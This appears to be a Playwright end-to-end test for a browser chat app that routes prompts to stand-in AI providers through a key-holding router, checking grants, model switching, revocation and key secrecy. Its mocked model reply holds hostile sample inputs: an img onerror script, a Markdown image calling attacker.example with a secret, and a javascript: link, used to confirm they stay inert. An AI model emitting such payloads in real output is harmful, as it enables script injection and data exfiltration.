// The chat app, and the two ways a site can hold the AI router: in a hidden
// frame, or through the router window when the frame cannot load.
// Needs `npx wrangler dev --port 8787` running (PORT=<n> for another port).
import { createRequire } from "node:module";
import { readFile } from "node:fs/promises";
const { chromium } = createRequire(import.meta.url)("playwright");
const PORT = process.env.PORT || 8787;
const base = (name) => `http://${name}.localhost:${PORT}`;
const browser = await chromium.launch();
const ctx = await browser.newContext({ acceptDownloads: true });
// The pages ask for web fonts. The tests do not wait on another network for them.
await ctx.route(/^https:\/\/fonts\.(googleapis|gstatic)\.com\//, (route) => route.abort());
const errors = [];
ctx.on("page", (p) => { p.on("pageerror", (e) => errors.push(`${p.url()}: ${e.message}`)); });
let failed = 0;
const check = (name, ok, extra = "") => { console.log(`${ok ? "ok  " : "FAIL"} ${name}${extra ? " " + extra : ""}`); if (!ok) failed++; };
const popupFrom = async (page, click) => { const [popup] = await Promise.all([page.waitForEvent("popup"), click()]); await popup.waitForLoadState(); return popup; };
const KEY = "sk-test-THIS-KEY-MUST-NOT-LEAK-0123456789";
// In the router window an account is a group, and its models are the choices inside it.
const pickModel = (popup, account, model) => popup.locator("#choices .account", { hasText: account }).locator("label", { hasText: model }).click();
const KEY2 = "sk-spare-THIS-ONE-MUST-NOT-LEAK-EITHER-9876543210";

// A stand-in for Anthropic. What it says depends on the last thing it was asked.
const MARKDOWN = [
  "# Tea", "", "Here is a **list**:", "", "- one", "- two", "", "```js", "const tea = 1 < 2;", "```", "",
  "<img src=x onerror=\"document.title='hacked'\">", "", "![chart](https://attacker.example/log?q=secret)", "",
  "[a link](https://example.com/page) and [a bad one](javascript:document.title='hacked')",
].join("\n");
const seen = [];
await ctx.route("https://api.anthropic.com/**", async (route) => {
  const request = route.request();
  const cors = { "access-control-allow-origin": "*", "access-control-allow-headers": "*" };
  if (request.method() === "OPTIONS") return route.fulfill({ status: 204, headers: cors });
  const body = JSON.parse(request.postData());
  seen.push({ key: request.headers()["x-api-key"], body, from: request.frame().url(), parent: request.frame().parentFrame()?.url() });
  const asked = body.messages.at(-1).content;
  if (/slowly/.test(asked)) await new Promise((resolve) => setTimeout(resolve, 2500));
  const pieces = /markdown/.test(asked) ? MARKDOWN.match(/[\s\S]{1,17}/g) : ["Dear Ada, ", "well done ", "on passing."];
  const sse = (o) => `event: ${o.type}\ndata: ${JSON.stringify(o)}\n\n`;
  const answer = sse({ type: "message_start", message: { usage: { input_tokens: 21 } } })
    + pieces.map((text) => sse({ type: "content_block_delta", index: 0, delta: { type: "text_delta", text } })).join("")
    + sse({ type: "message_delta", usage: { output_tokens: 9 } }) + sse({ type: "message_stop" });
  route.fulfill({ status: 200, headers: { ...cors, "content-type": "text/event-stream" }, body: answer }).catch(() => {});   // the page may have stopped waiting
});

// A stand-in for OpenAI, for an account that is set up later, in the router window.
const seenOpenAI = [];
await ctx.route("https://api.openai.com/**", async (route) => {
  const request = route.request();
  const cors = { "access-control-allow-origin": "*", "access-control-allow-headers": "*" };
  if (request.method() === "OPTIONS") return route.fulfill({ status: 204, headers: cors });
  const body = JSON.parse(request.postData());
  seenOpenAI.push({ key: request.headers()["authorization"], body, from: request.frame().url() });
  const data = (o) => `data: ${JSON.stringify(o)}\n\n`;
  const answer = ["A note ", "from the ", "stand-in."].map((content) => data({ choices: [{ index: 0, delta: { content } }] })).join("") + data({ choices: [], usage: { prompt_tokens: 12, completion_tokens: 6 } }) + "data: [DONE]\n\n";
  route.fulfill({ status: 200, headers: { ...cors, "content-type": "text/event-stream" }, body: answer }).catch(() => {});
});

// The person has one account in their router.
const home = await ctx.newPage();
await home.goto(base("router") + "/");
await home.click("#add summary");
await home.fill("#label", "Work key");
await home.fill("#key", KEY);
await home.click("#form button");
await home.waitForSelector("#accounts li[data-id]");
const allow = async (popup) => { await popup.waitForSelector("#yes"); await popup.click("#yes"); };

// ------------------------------------------------------------ the chat app
const chat = await ctx.newPage();
await chat.goto(base("hub") + "/chat/");
await chat.locator("#model.ask").waitFor();
check("the chat app starts with no model and nothing saved", (await chat.locator("#model-text").innerText()) === "Choose a model" && /Nothing saved yet/.test(await chat.locator("#list").innerText()) && (await chat.locator(".empty").count()) === 1);
check("it holds the router in a hidden frame", chat.frames().some((f) => f.url() === base("router") + "/frame.html"));

// The first message opens the router window, because there is no model yet.
await chat.fill("#prompt", "Write a card for Ada");
let popup = await popupFrom(chat, () => chat.press("#prompt", "Enter"));
check("the router window names the chat app's address", (await popup.locator(".origin").innerText()) === base("hub"));
await Promise.all([popup.waitForEvent("close"), allow(popup)]);
await chat.locator(".msg.assistant .msg-actions").waitFor();
check("after the person allows it, the message is sent and the answer arrives", (await chat.locator(".msg.user .bubble").innerText()) === "Write a card for Ada" && (await chat.locator(".msg.assistant .md").innerText()) === "Dear Ada, well done on passing.");
check("the answer is labelled with the model the person chose", (await chat.locator(".msg.assistant .who").innerText()).toLowerCase() === "claude-sonnet-5-5" && (await chat.locator("#model-text b").innerText()) === "claude-sonnet-5-5" && (await chat.locator("#model-text .from").innerText()) === "Work key");
check("the call was made by the router's page for that provider, with the key", seen.at(-1).from === base("router") + "/call/anthropic" && seen.at(-1).key === KEY && seen.at(-1).body.max_tokens === 4000);
check("the conversation is named after the first message and listed", (await chat.locator("#title").innerText()) === "Write a card for Ada" && (await chat.locator("#list a.conv").count()) === 1 && /^#c=/.test(new URL(chat.url()).hash));

// A second message carries the conversation so far.
await chat.fill("#prompt", "Make it shorter");
await chat.press("#prompt", "Enter");
await chat.locator(".msg.assistant").nth(1).locator(".msg-actions").waitFor();
check("the next message is sent with the conversation so far", JSON.stringify(seen.at(-1).body.messages) === JSON.stringify([
  { role: "user", content: "Write a card for Ada" }, { role: "assistant", content: "Dear Ada, well done on passing." }, { role: "user", content: "Make it shorter" }]) && seen.at(-1).body.system === undefined);

// Instructions are sent before the messages.
await chat.click("#more");
await chat.click("#menu-instructions");
await chat.fill("#instructions-input", "Answer in one line.");
await chat.click('#instructions-dialog button[value="save"]');
await chat.locator("#notice", { hasText: "Instructions saved" }).waitFor();
await chat.fill("#prompt", "And again");
await chat.press("#prompt", "Enter");
await chat.locator(".msg.assistant").nth(2).locator(".msg-actions").waitFor();
check("instructions for the conversation are sent as the system message", seen.at(-1).body.system === "Answer in one line." && seen.at(-1).body.messages.length === 5, JSON.stringify(seen.at(-1).body).slice(0, 400));

// A reload: the conversation and the model are still there, with no window.
await chat.reload();
await chat.locator(".msg.assistant").nth(2).waitFor();
await chat.locator("#model-jack.on").waitFor();
check("after a reload the conversation is still there", (await chat.locator(".msg").count()) === 6 && (await chat.locator("#title").innerText()) === "Write a card for Ada");
check("and so is the model, with no window", /claude-sonnet-5-5 Work key/.test(await chat.locator("#model-text").innerText()) && ctx.pages().length === 2);

// Change the model. The model button opens the router window again, and an account can be set up there.
popup = await popupFrom(chat, () => chat.click("#model"));
await popup.waitForSelector("#yes");
check("the model button opens the router window, which says what the app uses now", /It uses claude-sonnet-5-5 from your account Work key now\./.test(await popup.locator("#main").innerText()) && (await popup.locator("#add").count()) === 1);
await popup.click("#add summary");
await popup.selectOption("#provider", "openai");
await popup.fill("#label", "Spare key");
await popup.fill("#key", KEY2);
await popup.click("#form button");
await popup.locator("#choices .account", { hasText: "Spare key" }).waitFor();
const ticked = async () => ({ account: await popup.locator("#choices .account:has(input:checked) .account-name strong").innerText(), model: (await popup.locator("#choices label:has(input:checked)").innerText()).trim() });
check("an account set up in the router window is offered at once, and its first model is ticked", JSON.stringify(await ticked()) === JSON.stringify({ account: "Spare key", model: "gpt-6.2-sol" }) && /prompts to api\.openai\.com\./.test(await popup.locator("#lock").innerText()), JSON.stringify(await ticked()));
check("the new account is saved in the router, for the next site too", (await home.evaluate(() => JSON.parse(localStorage.getItem("router.accounts")).map((a) => a.label).join())) === "Work key,Spare key");
await Promise.all([popup.waitForEvent("close"), popup.click("#yes")]);
await chat.locator("#model-text", { hasText: "gpt-6.2-sol" }).waitFor();
check("the app shows the model, and the account it comes from, apart", (await chat.locator("#model-text b").innerText()) === "gpt-6.2-sol" && (await chat.locator("#model-text .from").innerText()) === "Spare key");
const anthropicBefore = seen.length;
await chat.fill("#prompt", "Now with the other one");
await chat.press("#prompt", "Enter");
await chat.locator(".msg.assistant").nth(3).locator(".msg-actions").waitFor();
check("after the change the app's next message goes to the new provider, with the conversation so far", (await chat.locator(".msg.assistant .md").nth(3).innerText()) === "A note from the stand-in." && seen.length === anthropicBefore
  && seenOpenAI.at(-1).from === base("router") + "/call/openai" && seenOpenAI.at(-1).key === "Bearer " + KEY2 && seenOpenAI.at(-1).body.model === "gpt-6.2-sol" && seenOpenAI.at(-1).body.messages.length === 8, JSON.stringify(seenOpenAI.at(-1) && seenOpenAI.at(-1).body.messages.length));
const callPages = chat.frames().filter((f) => f.url().includes("/call/")).map((f) => f.url());
check("the page for the old provider is gone, and there is one page, for the new provider", callPages.join() === base("router") + "/call/openai", callPages.join());
const newCall = chat.frames().find((f) => f.url().includes("/call/"));
const reach = (address) => newCall.evaluate((a) => fetch(a, { mode: "no-cors" }).then(() => "allowed", () => "blocked"), address);
check("the new page cannot connect to the old provider", (await reach("https://api.anthropic.com/v1/messages")) === "blocked" && seen.length === anthropicBefore);
check("the answer is labelled with the model that wrote it, and the earlier ones keep theirs", (await chat.locator(".msg.assistant .who").allInnerTexts()).map((t) => t.toLowerCase()).join() === "claude-sonnet-5-5,claude-sonnet-5-5,claude-sonnet-5-5,gpt-6.2-sol");
// And back again.
popup = await popupFrom(chat, () => chat.click("#model"));
await popup.waitForSelector("#yes");
check("the router window ticks the model in use", JSON.stringify(await ticked()) === JSON.stringify({ account: "Spare key", model: "gpt-6.2-sol" }) && /It uses gpt-6\.2-sol from your account Spare key now\./.test(await popup.locator("#main").innerText()));
await pickModel(popup, "Work key", "claude-sonnet-5-5");
await Promise.all([popup.waitForEvent("close"), popup.click("#yes")]);
await chat.locator("#model-text", { hasText: "claude-sonnet-5-5" }).waitFor();
// The frame opens the page for the provider as soon as it has the grant. Give it a moment to load.
const callPagesNow = () => chat.frames().filter((f) => f.url().includes("/call/")).map((f) => f.url()).join();
for (let i = 0; i < 50 && callPagesNow() !== base("router") + "/call/anthropic"; i++) await chat.waitForTimeout(100);
check("the model can be changed back, and the page for the other provider is closed again", callPagesNow() === base("router") + "/call/anthropic", callPagesNow());

// The same provider can be added again under another name, with another key. The two are told apart.
const KEY3 = "sk-other-A-SECOND-ANTHROPIC-KEY-5550001111";
popup = await popupFrom(chat, () => chat.click("#model"));
await popup.waitForSelector("#yes");
await popup.click("#add summary");
await popup.selectOption("#provider", "anthropic");
await popup.fill("#label", "Team key");
await popup.fill("#key", KEY3);
await popup.click("#form button");
await popup.locator("#choices .account", { hasText: "Team key" }).waitFor();
const sameModel = await popup.locator("#choices .account").evaluateAll((all) => all.filter((group) => [...group.querySelectorAll("label")].some((label) => label.textContent.trim() === "claude-sonnet-5-5"))
  .map((group) => group.querySelector(".account-name").innerText.replace(/\s+/g, " ").trim()));
check("the same model can be offered by two accounts, told apart by the name each was given and the end of its key", sameModel.length === 2 && sameModel[0] === "Work key Anthropic, key ends " + KEY.slice(-4) && sameModel[1] === "Team key Anthropic, key ends " + KEY3.slice(-4), JSON.stringify(sameModel));
check("the account just added is the one ticked, not the other with the same model", JSON.stringify(await ticked()) === JSON.stringify({ account: "Team key", model: "claude-sonnet-5-5" }));
await Promise.all([popup.waitForEvent("close"), popup.click("#yes")]);
await chat.locator("#model-text .from", { hasText: "Team key" }).waitFor();
await chat.fill("#prompt", "Which key is this");
await chat.press("#prompt", "Enter");
await chat.locator(".msg.assistant").nth(4).locator(".msg-actions").waitFor();
check("and the next message is sent with that account's key", seen.at(-1).key === KEY3 && seen.at(-1).body.model === "claude-sonnet-5-5" && (await chat.locator("#model-text b").innerText()) === "claude-sonnet-5-5");

// What the model writes is shown as Markdown, and none of it runs.
await chat.click("#new-chat");
await chat.fill("#prompt", "Show me some markdown");
await chat.press("#prompt", "Enter");
await chat.locator(".msg.assistant .msg-actions").waitFor();
const md = chat.locator(".msg.assistant .md");
check("Markdown in an answer is drawn: a heading, a list and a code block", (await md.locator("h3").innerText()) === "Tea" && (await md.locator("ul li").count()) === 2 && (await md.locator("strong").first().innerText()) === "list"
  && (await md.locator(".code pre code").innerText()) === "const tea = 1 < 2;" && (await md.locator(".code-bar span").innerText()) === "js");
check("HTML in an answer is shown as text and does not run", (await md.locator("img").count()) === 0 && /<img src=x onerror=/.test(await md.innerText()) && !/hacked/.test(await chat.title()));
check("an image in an answer is not loaded, and a javascript: link is not a link", (await md.locator('a[href^="https://attacker.example"]').count()) === 1 && (await md.locator("a").count()) === 2 && (await md.locator('a[href^="javascript"]').count()) === 0);
check("there are now two conversations, newest first", (await chat.locator("#list a.conv").allInnerTexts()).join("|") === "Show me some markdown|Write a card for Ada");

// Stop an answer part way.
await chat.fill("#prompt", "Answer slowly please");
await chat.press("#prompt", "Enter");
await chat.locator("#stop:not([hidden])").waitFor();
await chat.click("#stop");
await chat.locator(".tail", { hasText: "You stopped this answer" }).waitFor();
check("an answer can be stopped, and the message box is ready again", (await chat.locator("#send").isVisible()) && !(await chat.locator("#stop").isVisible()));

// Search, rename, export and delete.
await chat.fill("#search", "ada");
check("search finds a conversation by the words in it", (await chat.locator("#list a.conv").allInnerTexts()).join("|") === "Write a card for Ada");
await chat.fill("#search", "");
await chat.click("#more");
await chat.click("#menu-rename");
await chat.fill("#rename-input", "Tea notes");
await chat.click('#rename-dialog button[value="save"]');
await chat.locator("#list a.conv", { hasText: "Tea notes" }).waitFor();
check("a conversation can be renamed", (await chat.locator("#title").innerText()) === "Tea notes" && (await chat.locator("#list a.conv").first().innerText()) === "Tea notes");
const [download] = await Promise.all([chat.waitForEvent("download"), chat.click("#export-all")]);
const exported = JSON.parse(await readFile(await download.path(), "utf8"));
check("Export all writes every conversation to a file", exported.conversations.length === 2 && exported.conversations.some((c) => c.title === "Tea notes" && c.messages.length === 4) && !JSON.stringify(exported).includes(KEY));
await chat.click("#more");
await chat.click("#menu-delete");
await chat.click('#delete-dialog button[value="delete"]');
await chat.locator(".empty").waitFor();
check("a conversation can be deleted", (await chat.locator("#list a.conv").allInnerTexts()).join("|") === "Write a card for Ada");
await chat.locator("#import-file").setInputFiles(await download.path());
await chat.locator("#notice", { hasText: "2 conversations added" }).waitFor();
check("Import reads that file back", (await chat.locator("#list a.conv").count()) === 3);
await chat.reload();
await chat.locator("#list a.conv").nth(2).waitFor();
check("and all of it is still there after a reload", (await chat.locator("#list a.conv").count()) === 3);
const kept = await chat.evaluate((key) => JSON.stringify({ ...localStorage }).includes(key) || document.documentElement.innerHTML.includes(key), KEY);
check("the chat app never held the key", !kept);

// ------------------------------------------- a site that cannot have the frame
// A page whose own Content-Security-Policy forbids frames from other addresses.
const LOCKED = `
  const started = performance.now();
  const { connect } = await import("${base("router")}/router.js");
  const ai = window.ai = await connect();
  window.took = performance.now() - started;
  ai.onchange(() => { document.title = ai.ready ? "ready" : "not ready"; });
  document.getElementById("go").onclick = async () => { document.getElementById("out").textContent = "chose: " + await ai.choose().catch((e) => e.code); };
  document.title = "connected";`;
const locked = await ctx.newPage();
// Any page of another site will do. The policy is added before the router is asked for.
await locked.goto(base("planner") + "/a-page-that-is-not-there");
await locked.evaluate(() => {
  const policy = document.createElement("meta");
  policy.httpEquiv = "Content-Security-Policy";
  policy.content = "frame-src 'none'";
  document.head.append(policy);
  document.body.innerHTML = '<button id="go">Choose</button><pre id="out"></pre>';
});
await locked.addScriptTag({ type: "module", content: LOCKED });
await locked.waitForFunction(() => document.title === "connected");
check("a site whose own policy forbids the frame falls back to the router window", (await locked.evaluate(() => window.ai.mode)) === "window" && locked.frames().length === 1 && (await locked.evaluate(() => window.ai.ready)) === false);
check("it finds out at once, from the browser's report, and does not wait for a timer", (await locked.evaluate(() => window.took)) < 2000, String(Math.round(await locked.evaluate(() => window.took))) + " ms");
const refused = await locked.evaluate(() => window.ai.chat.completions.create({ messages: [{ role: "user", content: "hi" }] }).then(() => null, (e) => ({ code: e.code, status: e.status })));
check("with no window open, a request is refused as having no model", refused && refused.code === "no-grant" && refused.status === 401, JSON.stringify(refused));

popup = await popupFrom(locked, () => locked.click("#go"));
await popup.waitForSelector("#yes");
check("the router window knows the site from the browser, with no frame to ask", (await popup.locator(".origin").innerText()) === base("planner") && /stay open after you choose/.test(await popup.locator("#main").innerText()));
await popup.click("#yes");
await popup.locator("h1", { hasText: "Keep this window open" }).waitFor();
await locked.waitForFunction(() => document.title === "ready");
check("after Allow the window stays open and says why", !popup.isClosed() && /claude-sonnet-5-5, from your account Work key/.test(await popup.locator("#main").innerText()) && /chose: true/.test(await locked.locator("#out").innerText()));
const through = await locked.evaluate(async () => {
  const answer = await window.ai.chat.completions.create({ messages: [{ role: "user", content: "A card for Ada" }] });
  let text = "";
  for await (const piece of window.ai.prompt("And again")) text += piece;
  return { chat: answer.choices[0].message.content, model: answer.model, prompt: text };
});
check("the site's requests are answered through the window, both ways of asking", through.chat === "Dear Ada, well done on passing." && through.prompt === "Dear Ada, well done on passing." && through.model === "claude-sonnet-5-5");
check("the call is made by the page for the one provider, inside the router window", seen.at(-1).from === base("router") + "/call/anthropic" && seen.at(-1).parent === base("router") + "/pick.html#window" && seen.at(-1).key === KEY, seen.at(-1).parent);
await popup.locator("#left", { hasText: "18 requests left" }).waitFor();
check("the window shows how many requests are left", true);
check("the site holds no frame and no key", locked.frames().length === 1 && !(await locked.evaluate((key) => JSON.stringify({ ...localStorage }).includes(key), KEY)));

// Closing the window disconnects the site, and a request that was waiting is told.
const waiting = locked.evaluate(() => window.ai.chat.completions.create({ messages: [{ role: "user", content: "Answer slowly" }] }).then(() => null, (e) => ({ code: e.code, status: e.status })));
await locked.waitForTimeout(400);
await popup.close();
const cut = await waiting;
check("closing the window ends a request that was waiting, with an error the site can read", cut && cut.code === "closed" && cut.status === 503, JSON.stringify(cut));
await locked.waitForFunction(() => document.title === "not ready");
check("and the site is told it has no model now", (await locked.evaluate(() => window.ai.ready)) === false);

// Opening it again needs no second choice: the grant was kept.
popup = await popupFrom(locked, () => locked.click("#go"));
await popup.locator("h1", { hasText: "Keep this window open" }).waitFor();
await locked.waitForFunction(() => document.title === "ready");
check("opening the window again connects at once, with nothing to choose", (await popup.locator("#yes").count()) === 0 && /chose: true/.test(await locked.locator("#out").innerText()));

// Choosing again from the site brings the choices back in the same window.
await locked.evaluate(() => { document.getElementById("out").textContent = ""; });
await locked.click("#go");
await popup.waitForSelector("#yes");
check("the site can ask the person to choose again in the open window", /It uses claude-sonnet-5-5 from your account Work key now\./.test(await popup.locator("#main").innerText()) && (await popup.locator("#no").innerText()) === "Keep what it has");
await popup.click("#no");
await popup.locator("h1", { hasText: "Keep this window open" }).waitFor();
await locked.locator("#out", { hasText: "chose: false" }).waitFor();
check("and keeping what it has leaves the site connected", (await locked.evaluate(() => window.ai.ready)) === true);

// Stop at the router: the next request is refused and the window closes.
await home.bringToFront();
await home.evaluate(() => dispatchEvent(new Event("focus")));
await home.locator("#grants li", { hasText: "planner" }).locator("[data-revoke]").click();
await home.locator("#grants li", { hasText: "planner" }).locator("text=Stopped").waitFor();
const calls = seen.length;
const stopped = await Promise.all([popup.waitForEvent("close"), locked.evaluate(() => window.ai.chat.completions.create({ messages: [{ role: "user", content: "hi" }] }).then(() => null, (e) => ({ code: e.code, status: e.status, message: e.message })))]);
check("after Stop at the router, the next request is refused and the window closes", stopped[1] && stopped[1].code === "no-grant" && /revoked/.test(stopped[1].message) && seen.length === calls, JSON.stringify(stopped[1]));

// When the site's page goes away, so does the window.
popup = await popupFrom(locked, () => locked.click("#go"));
await popup.waitForSelector("#yes");
await Promise.all([popup.waitForEvent("close"), locked.goto("about:blank")]);
check("the window closes when the site's page goes away", popup.isClosed());
await locked.close();

// ---------------------------------- the chat app, through the router window
const viaWindow = await ctx.newPage();
await viaWindow.goto(base("hub") + "/chat/?via=window");
await viaWindow.locator("#model.ask").waitFor();
check("the chat app can be told to use the router window", (await viaWindow.locator("#model-text").innerText()) === "Connect a model" && viaWindow.frames().length === 1);
popup = await popupFrom(viaWindow, () => viaWindow.click("#model"));
// The chat app's address already has a grant, held by the frame. Where the browser gives the
// frame storage of its own, the window does not have that grant, and asks.
await popup.locator("#yes, #again").first().waitFor();
if (await popup.locator("#yes").count()) await popup.click("#yes");
await popup.locator("h1", { hasText: "Keep this window open" }).waitFor();
await viaWindow.locator("#model-jack.on").waitFor();
await viaWindow.fill("#prompt", "A card through the window");
await viaWindow.press("#prompt", "Enter");
await viaWindow.locator(".msg.assistant .msg-actions").waitFor();
check("a message is answered through the window", (await viaWindow.locator(".msg.assistant .md").innerText()) === "Dear Ada, well done on passing." && seen.at(-1).parent === base("router") + "/pick.html#window");
await popup.close();
await viaWindow.locator("#model.ask").waitFor();
await viaWindow.fill("#prompt", "Is anyone there");
const again = await popupFrom(viaWindow, () => viaWindow.press("#prompt", "Enter"));
await again.locator("h1", { hasText: "Keep this window open" }).waitFor();
await viaWindow.locator(".msg.assistant").nth(1).locator(".msg-actions").waitFor();
check("with the window closed, sending a message opens it again and then sends", (await viaWindow.locator(".msg.assistant .md").nth(1).innerText()) === "Dear Ada, well done on passing.");

check("no page threw an error", errors.length === 0, errors.join(" ; "));
await browser.close();
console.log(failed ? `\n${failed} failed` : "\nall passed");
process.exit(failed ? 1 : 0);
